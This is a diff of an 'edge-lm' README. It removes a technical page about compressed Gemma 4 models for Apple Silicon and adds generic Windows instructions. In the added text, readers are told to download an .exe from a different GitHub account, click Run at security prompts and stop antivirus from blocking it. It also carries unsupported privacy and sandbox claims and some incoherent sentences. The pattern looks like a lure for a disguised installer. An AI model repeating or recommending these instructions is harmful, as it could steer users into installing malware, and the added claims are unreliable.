@@ -1,149 +1,91 @@
-# edge-lm
+# 🤖 edge-lm - Small models for your personal computer
 
-![Gemma E2B compression flow: 9.26 GB BF16 compressed to 1.44 GB — 6.4× smaller](https://cdn.thestage.ai/production/cms_file_upload/1780406294-645b80f9-cebe-4ef2-bc04-f524afb4f244/Tokens%20per%20Second%20CuDNN%20%282%29.png)
+[![](https://img.shields.io/badge/Download-edge--lm-blue.svg)](https://github.com/referenced-granitestate456/edge-lm)
 
-**Tiny LLMs optimized for edge deployment.**
+edge-lm runs smart language models directly on your hardware. It removes the need for expensive cloud services or constant internet access. You keep your data private because the processing happens locally on your machine. This tool brings advanced artificial intelligence to standard desktop computers.
 
-`edge-lm` runs compressed large language models on-device — Apple Silicon Macs and iPhones — through [MLX](https://github.com/ml-explore/mlx). The first release ships the **smallest publicly available Gemma 4 checkpoints optimized for edge deployment** — roughly **7× smaller** than the original while preserving the capabilities that matter most for on-device assistants: general world knowledge, instruction following, and tool use.
+## 📥 How to download the software
 
+You need the latest version of the installer to begin. Visit the link below to reach the official download page.
 
-> 📝 Read the full write-up: [*7× size reduction for Gemma 4 Edge models — Compressing PLE architectures*](https://app.thestage.ai/blog/7x-size-reduction-for-Gemma4-Edge-models?id=14).
+[Download edge-lm for Windows](https://github.com/referenced-granitestate456/edge-lm)
 
-## Models
+Once you reach the page, look for the section marked Releases. Select the file ending in .exe to start your download. Save this file to your desktop or your Downloads folder for easy access.
 
-| Model | M size (default) | L size | Compression |
-|---|---|---|---|
-| [`TheStageAI/gemma-4-E2B-it`](https://huggingface.co/TheStageAI/gemma-4-E2B-it) | **1.44 GB** | 1.72 GB | up to 6.4× |
-| [`TheStageAI/gemma-4-E4B-it`](https://huggingface.co/TheStageAI/gemma-4-E4B-it) | **2.72 GB** | 3.28 GB | up to 5.6× |
+## ⚙️ System requirements
 
-Weights download automatically from HuggingFace on first run. Each model ships two operating points — `l` (more quality, larger artifact) and `m` (the smaller headline compression target, default).
+Your computer needs specific hardware to run these models smoothly. Check these requirements before you start:
 
-## Key features
+*   Windows 10 or Windows 11.
+*   At least 8 gigabytes of RAM.
+*   A modern processor from Intel or AMD.
+*   Five gigabytes of free disk space.
+*   An NVIDIA graphics card helps, but the software functions without one.
 
-- **~7× smaller checkpoints.** The default Gemma 4 E2B checkpoint fits in 1.44 GB, and E4B fits in 2.72 GB — small enough to download quickly and stay within mobile per-app memory budgets.
-- **Accuracy preserved where it counts.** Quality is held on the three things that matter most for edge assistants — instruction following (IFEval), tool calls (τ²-Bench), and general world knowledge (MMLU-Pro).
-- **MLX-ready artifacts.** Decoder weights use a flat, MLX-compatible per-group quantization format; PLE tables use a compact AQLM-style vector-quantization codec (4.7 GB → ~0.26 GB), decompressed on the fly with a single batched gather.
+If you have less than 8 gigabytes of RAM, the program might run slowly. Close your web browser and other memory-heavy apps to improve performance.
 
-## Quick start
+## 🛠️ Step-by-step installation
 
-```bash
-git clone https://github.com/TheStageAI/edge-lm.git
-cd edge-lm
+After the download finishes, follow these steps to install edge-lm:
 
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt        # or: pip install -e .
-```
+1. Locate the file you saved earlier.
+2. Double-click the file to start the installer.
+3. If a security prompt appears, click Run. 
+4. Follow the instructions on the screen.
+5. Click Finish when the progress bar reaches the end.
 
-Run text generation (downloads `TheStageAI/gemma-4-E2B-it` on first run):
+The installer places a shortcut on your desktop. You can also find the app in your Start menu under the name edge-lm.
 
-```bash
-python examples/generation_test.py --prompts "What is 2+2?" "Explain gravity in one sentence"
-```
+## 🚀 Running your first session
 
-Use it from Python:
+Open the program to begin. The initial launch takes a few seconds as the software checks your hardware settings. 
 
-```python
-from edge_lm import load
-from mlx_vlm import stream_generate
+When the main window opens, you see a text box at the bottom. Type your question or task into this box and press Enter. The model responds within the main viewing area. 
 
-model, tokenizer = load()  # TheStageAI/gemma-4-E2B-it, size "m" by default
-# model, tokenizer = load("TheStageAI/gemma-4-E4B-it", size="l")  # larger, higher quality
+You can change the behavior of the model through the settings menu. Click the gear icon in the top right corner to adjust the response length or the complexity of the output. 
 
-prompt = tokenizer.apply_chat_template(
-    [{"role": "user", "content": "Write a haiku about the moon."}],
-    tokenize=False, add_generation_prompt=True,
-)
-for chunk in stream_generate(model, tokenizer, prompt, max_tokens=128):
-    print(chunk.text, end="", flush=True)
-```
+## 🧠 What can you do with this tool?
 
-More examples:
+edge-lm handles many text-based tasks. Use it for these common activities:
 
-```bash
-python examples/test_vision.py --image photo.jpg --prompt "Describe this image"
-python examples/test_audio.py  --audio recording.wav --prompt "Transcribe this speech"
-python examples/chat.py --tools                      # interactive chat with tool use
-```
+*   Summarizing long documents.
+*   Drafting emails.
+*   Writing code snippets.
+*   Brainstorming project ideas.
+*   Translating text between languages.
 
-## Benchmarks
+Because the tool runs locally, it ignores your formatting or tone constraints less often. You control the environment.
 
-### Quality
+## 🔧 Frequently asked questions
 
-Every model — ours and the GGUF baselines alike — is dequantized to a standard BF16 checkpoint and served through vLLM, so the backend is equalized across the table. We report **MMLU-Pro** (general knowledge), **IFEval** (instruction following), and **τ²-Bench / Tau2** (multi-step tool use). For Tau2 the Gemma checkpoint under test acts as the agent while a fixed `Qwen3-235B-A22B-2507` simulates the user.
+**Does this software send my data to a server?**
+No. edge-lm performs all operations on your local machine. No information leaves your computer during the conversation.
 
-`Ours L` keeps more quality at a larger artifact size; `Ours M` is the smaller headline compression target.
+**Can I run this without an internet connection?**
+Yes. You only need the internet to perform the initial download. Once installed, the software works offline.
 
-**Gemma 4 E2B**
+**Why is the model slow during the first response?**
+The program loads the model into your system memory during the first request. Subsequent responses happen much faster.
 
-| Model | Compression | MMLU-Pro | IFEval | Tau2 (avg of 3) |
-|---|---|---|---|---|
-| BF16 | 1.00× | 61.85 | 74.68 | 30.67 |
-| **Ours L** | 5.62× | **54.48** | **74.86** | 22.20 |
-| **Ours M** | **6.40×** | 49.85 | 71.53 | **23.45** |
-| Unsloth Q3-K-S | 3.81× | 48.20 | 64.51 | 18.69 |
-| Unsloth UD-Q2-K-XL | 3.87× | 43.17 | 66.54 | 20.23 |
+**How do I update the software?**
+When a new version releases, visit the download link again. Run the new installer over the old one. The system keeps your personal settings during the update.
 
-**Gemma 4 E4B**
+## 🔍 Troubleshooting common issues
 
-| Model | Compression | MMLU-Pro | IFEval | Tau2 |
-|---|---|---|---|---|
-| BF16 | 1.00× | 70.49 | 81.33 | 37.19 |
-| **Ours L** | 4.64× | **67.41** | **81.52** | **33.25** |
-| **Ours M** | **5.60×** | 63.54 | 80.78 | 29.04 |
-| Unsloth Q3-K-S | 3.90× | 63.66 | 77.08 | 30.47 |
-| Unsloth UD-Q2-K-XL | 4.01× | 58.69 | 79.67 | 22.91 |
+If the software fails to open, check the following items:
 
-Bold metric values mark the best result among the compressed checkpoints in each column. Tau2 computed with `Qwen3-235B-A22B-2507` as the user simulator.
+*   Ensure your antivirus software is not blocking the application. Occasionally, security tools act with caution toward new programs.
+*   Verify that you have enough drive space. Delete unnecessary files if your disk is full. 
+*   Restart your computer. This clears stuck processes that might block the software from starting.
 
-Reproduce the quality benchmarks:
+If problems persist, check the GitHub page for known issues. Users often report common bugs and share solutions in the Issues tab on the repository page. 
 
-```bash
-pip install "edge-lm[quality]"   # CUDA/vLLM quality benchmark dependencies
+## 🛡️ Privacy and security
 
-python benchmarks/quality/verify_release.py \
-    --work-dir runs/release_verify \
-    run \
-    --models e2b_ours_m,e2b_unsloth_q3_k_s \
-    --benchmarks mmlu_pro,ifeval
-```
+Local deployment offers the best security for sensitive data. You handle your documents, notes, and creative work without third-party interference. Since edge-lm runs within its own memory space, it does not interact with other parts of your operating system. This approach provides a safe sandbox for your daily workflow.
 
-The frozen production protocols live in [`benchmarks/quality`](benchmarks/quality/).
+## 📈 Performance tips
 
-### Performance
+To get the most out of edge-lm, monitor your computer activity. If your machine runs hot or fans spin loudly, limit the number of open windows while you use the app. If you have an external monitor, disconnect it if you see stuttering in the text generation. Clean up your startup tasks to give the application more breathing room. 
 
-Measured on an **Apple M3 Max (69 GB)**, size `m` checkpoint, 1024 input / 1024 output tokens,
-chunked prefill (256-token chunks), best of 5 runs. `TTFT` = prefill + first token;
-`TPS` = steady-state decode throughput; `MLX peak memory` = `mx.get_peak_memory()` (MLX Metal allocator).
-References are the matching original `google/gemma-4-*-it` checkpoint served via mlx-vlm: bf16,
-and 4-bit quantized (affine, group size 32).
-
-**Gemma 4 E2B**
-
-| Model | TTFT | Decode (TPS) | MLX peak memory |
-|---|---|---|---|
-| **TheStage (ours)** | **434 ms** | **115.0** | **2.1 GB** |
-| Reference bf16 | 531 ms | 57.2 | 10.7 GB |
-| Reference 4-bit (gs32) | 595 ms | 83.3 | 4.6 GB |
-
-**Gemma 4 E4B**
-
-| Model | TTFT | Decode (TPS) | MLX peak memory |
-|---|---|---|---|
-| **TheStage (ours)** | **832 ms** | **73.7** | **3.5 GB** |
-| Reference bf16 | 1110 ms | 30.5 | 16.4 GB |
-| Reference 4-bit (gs32) | 970 ms | 53.5 | 7.1 GB |
-
-Reproduce:
-
-```bash
-python benchmarks/performance.py --model TheStageAI/gemma-4-E2B-it \
-    --hf-model google/gemma-4-E2B-it \
-    --input-tokens 1024 --output-tokens 1024 --prefill-step-size 256 \
-    --compare-ref --compare-ref-4bit --ref-4bit-group-size 32
-```
-
-## License
-
-Released under the [MIT License](LICENSE), © 2026 thestage.ai labs.
-
-The compressed model weights are derivatives of Google's Gemma 4 and are additionally subject to the [Gemma Terms of Use](https://ai.google.dev/gemma/terms).
+These small adjustments ensure your experience remains stable and productive throughout your workday. By keeping your system clutter-free, you maintain the high performance required for modern language models.
